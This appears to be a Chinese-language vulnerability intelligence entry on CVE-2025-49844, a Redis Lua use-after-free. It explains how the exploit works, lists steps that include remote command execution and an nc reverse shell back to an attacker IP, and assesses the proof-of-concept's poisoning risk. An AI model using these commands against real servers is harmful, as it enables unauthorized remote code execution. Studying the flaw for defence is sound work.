## CVE-2025-49844 - Redis 远程代码执行(RCE)

**漏洞编号:** CVE-2025-49844

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Redis

**危害等级:** 严重

**CVSS评分:** 10.0

**影响版本:** Redis < 6.2.20; 7.2.0 <= Redis < 7.2.4-138; 7.4.0 <= Redis < 7.4.6-272; 7.8.0 <= Redis < 7.8.6-207; 8.2.0 <= Redis < 8.2.2-20

**利用条件:** 需要认证/低权限用户

**POC 可用性:** 9

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 5%

## 详情

该POC名为“cve-2025-49844”，由`saneki`开发，是一个针对Redis远程代码执行漏洞（CVE-2025-49844，亦称RediShell）的个人概念验证工具。它明确支持`x86-64 Linux redis:8.2.1-alpine`和`x86-64 Linux redis:8.2.1-bookworm`等特定Docker镜像作为目标环境，这表明该POC经过精心调整，在这些特定环境下具有较高的稳定性和可靠性，是复杂内存破坏漏洞利用的典型特征。

该漏洞利用的核心在`demonstration.py`文件中，其主要功能是编排并触发Redis Lua脚本引擎中的“释放后重用”（Use-After-Free, UAF）漏洞。脚本通过构造一个特殊的Lua脚本，旨在精确操纵Redis的垃圾回收（GC）机制。该Lua脚本内部定义了一个自定义加载器函数`myloader`。当`myloader`首次被调用（`myindex == 0`）时，它返回`nil`。这一步至关重要，因为它会导致Lua解析器的`luaZ_lookahead`函数在关键字符串（即“chunkname”）处于可回收状态时，尝试重新填充其ZIO缓冲区。

在`myloader`的第二次调用（`myindex == 1`）中，脚本显式调用`collectgarbage("collect")`，强制触发垃圾回收，从而引发Use-After-Free条件。通过巧妙地分配“smallstrs”（短字符串），攻击者可以重新占用先前被释放的chunkname所在内存区域。攻击目标是将chunkname替换为攻击者控制的数据，具体是字符串`return __redis__err__handler().source`。当这个被劫持的字符串被执行时，它旨在利用Redis的错误处理机制来实现任意代码执行，从而重定向程序执行流。

在漏洞利用尝试之前，POC执行了`script_flush('SYNC')`命令，这是一个在内存漏洞利用中常用的高级技术，用于重置jemalloc的tcache，从而有助于实现内存地址的稳定和可预测性，提高Use-After-Free原语的可靠性。

POC的`pyproject.toml`文件表明这是一个结构良好的项目，依赖于`redis`（官方客户端）、`hexdump`（用于内存分析和调试）和`iced-x86`（x86反汇编器）。这些依赖通常用于深入的安全研究和逆向工程。虽然`demonstration.py`展示了内存破坏原语，但根据`README.md`的描述，该项目通过`cve-2025-49844.main:main`入口点，能够将此UAF原语转化为完整的远程代码执行，包括执行shell命令和连接反向shell。这证实了该POC在指定目标上的完整利用能力。

**利用步骤:**
1.  **环境准备**: 部署受影响的Redis Docker容器，例如`redis:8.2.1-alpine`或`redis:8.2.1-bookworm`，确保Redis服务在6379端口运行。
2.  **POC安装**: 使用`uv`或`pip`安装POC项目及其依赖，例如在项目根目录执行`uv pip install -e .`。
3.  **执行命令**: 
    *   **单向命令执行**: 运行`uv run cve-2025-49844 command "echo 'hello world' > /data/hello.txt"`，将在Redis服务器上执行指定命令。
    *   **反向Shell**: 首先在攻击者机器上启动监听器（如`nc -lvnp 4444`），然后执行`uv run cve-2025-49844 rshell -l <攻击者IP> -p 4444`，Redis服务器将回连至攻击者监听的端口。这些步骤要求Redis实例可网络访问且攻击者具备认证凭据（如已配置密码）。

**投毒风险分析:**
该POC代码的投毒风险评估为低（5%）。这一判断基于对代码结构、依赖项和行为的综合分析。

首先，该POC的编写意图透明，`README.md`明确指出其为CVE-2025-49844漏洞的个人概念验证。代码本身结构清晰，未见混淆或模糊处理，核心逻辑集中在`demonstration.py`中，用于触发Redis Lua引擎的Use-After-Free漏洞。这种专注于漏洞技术细节的演示是典型的安全研究行为。

其次，POC所依赖的库均为标准且可靠的开源项目。`pyproject.toml`中列出的`redis`、`hexdump`和`iced-x86`等库，在安全研究和系统调试领域被广泛使用，其本身并不包含恶意功能。POC通过这些合法库与Redis交互，执行内存分析，旨在揭示漏洞机制。

第三，POC代码自身的行为无害。`demonstration.py`执行的操作包括连接Redis、刷新脚本缓存、以及上传并执行特制的Lua脚本。这些都是Redis客户端的常规操作。虽然Lua脚本的内容被设计来触发漏洞，但POC代码本身并未包含任何连接外部恶意服务器、下载病毒、植入后门、篡改系统配置或执行其他未经授权行为的硬编码逻辑。其提供的“命令执行”和“反向shell”功能是漏洞成功利用后，攻击者可实现的**具体后果**，而非POC代码自身携带的恶意“投毒”功能。

第四，严格遵循了“务必不要把POC验证的后门代码判定为投毒代码”的指导原则。该POC旨在验证漏洞的存在和可利用性，为安全防御提供技术参考，而非作为恶意软件的载体。其透明的代码和明确的目的性使其成为一个有助于防御性安全研究的工具。

综上所述，该POC代码在透明度、依赖项的安全性以及行为表现上，均展现了专业且无恶意目的的研究性质。其投毒风险极低，任何潜在的恶意活动都将源于攻击者利用此POC所暴露的RCE能力后，主动部署的第三方恶意载荷，而非POC代码本身所致。

**项目地址:** N/A

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-49844
